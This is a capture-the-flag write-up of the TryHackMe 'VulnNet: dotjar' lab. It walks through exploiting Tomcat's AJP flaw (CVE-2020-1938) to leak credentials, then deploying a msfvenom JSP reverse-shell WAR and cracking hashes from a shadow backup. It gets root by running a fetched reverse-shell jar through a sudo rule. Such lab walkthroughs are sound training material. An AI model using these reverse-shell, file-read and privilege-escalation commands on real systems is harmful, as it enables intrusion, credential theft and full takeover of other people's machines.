---
title: THM VulnNet DotJar
author: hanhctf
date: 2023-05-08 3:22:22 +0700
categories: [Write-up, THM]
tags: [Java]
toc: true
mermaid: true
---

# [**_VulnNet: dotjar room_**](https://tryhackme.com/room/vulnnetdotjar)

## Nmap

```shell
PORT     STATE SERVICE REASON  VERSION
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30

```

## Foothold

- On port 8080, Apache Tomcat/9.0.30
- On port 8009, ajp13 --> quick search --> CVE-2020-1938 --> can exploit with Metasploit  
![](/commons/THM/Vulnnet-dotjar/0_msf.png)

With the default param in Metasploit, we can see creds for `host-manager`

```
1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:
 
    webdev:Hgj3LA$02D$Fa@21
 
GUI access is disabled for security reasons.
 
4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>

```

In `Tomcat Virtual Host Manager` we can use an exploit from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)

1. Make a malicious .war file
  `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=9001 -f war -o shell.war`

2. Upload and deploy on vuln server
   ```curl --upload-file shell.war -u 'webdev:Hgj3LA$02D$Fa@21' "<http://10.10.208.139:8080/manager/text/deploy?path=/shell>"```

3. Get revershell

- Open listen `Terminal' on port 9001
    `nc -nlvp 9001'  
  
- Extract .jsp file from .war

    ```
    unzip shell.war
    Archive:  shell.war
    creating: WEB-INF/
    inflating: WEB-INF/web.xml
    inflating: opilidtxwqm.jsp
    ```

- Access vuln file
    `curl -u 'webdev:Hgj3LA$02D$Fa@21' "http://10.10.208.139:8080/shell/opilidtxwqm.jsp"`

## Privilege Escalation

- After enumeration, we can find a `shadow-backup-alt.gz` in `/var/backups`
- unzip `.gz` file with `gzip -d shadow-backup-alt.gz`, we can see 3 passwd hash of `root/jdk-admin/web`

```shell
cat shadow-backup-alt
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
daemon:*:18642:0:99999:7:::
bin:*:18642:0:99999:7:::
sys:*:18642:0:99999:7:::
sync:*:18642:0:99999:7:::
games:*:18642:0:99999:7:::
man:*:18642:0:99999:7:::
lp:*:18642:0:99999:7:::
mail:*:18642:0:99999:7:::
news:*:18642:0:99999:7:::
uucp:*:18642:0:99999:7:::
proxy:*:18642:0:99999:7:::
www-data:*:18642:0:99999:7:::
backup:*:18642:0:99999:7:::
list:*:18642:0:99999:7:::
irc:*:18642:0:99999:7:::
gnats:*:18642:0:99999:7:::
nobody:*:18642:0:99999:7:::
systemd-network:*:18642:0:99999:7:::
systemd-resolve:*:18642:0:99999:7:::
syslog:*:18642:0:99999:7:::
messagebus:*:18642:0:99999:7:::
_apt:*:18642:0:99999:7:::
uuidd:*:18642:0:99999:7:::
lightdm:*:18642:0:99999:7:::
whoopsie:*:18642:0:99999:7:::
kernoops:*:18642:0:99999:7:::
pulse:*:18642:0:99999:7:::
avahi:*:18642:0:99999:7:::
hplip:*:18642:0:99999:7:::
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
```

- Try crack hash with `hashcat` mode 1800, we got passwd of jdk-admin
***Got user flag***
- With jdk-admin password, run basic command to check vector priv linux

  ```
  sudo -l
  Matching Defaults entries for jdk-admin on vulnnet-dotjar:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar
  ```

- jdk-admin can run a `.jar` file as root user without passwd of root group
- Make a malicious `.jar`
  `msfvenom -p java/shell_reverse_tcp LHOST=10.8.51.36 LPORT=4444 -f jar -o rev.jar`
- Upload to victim via local server with python
  - On local
  `python -m http.server 80`
  - On djk-admin shell
  `wget 10.8.51.36/rev.jar`
- Listen on port 4444 on other `Terminal`
- Run `.jar` file on jdk-admin shell
`/usr/bin/java -jar rev.jar`

***Got root flag***
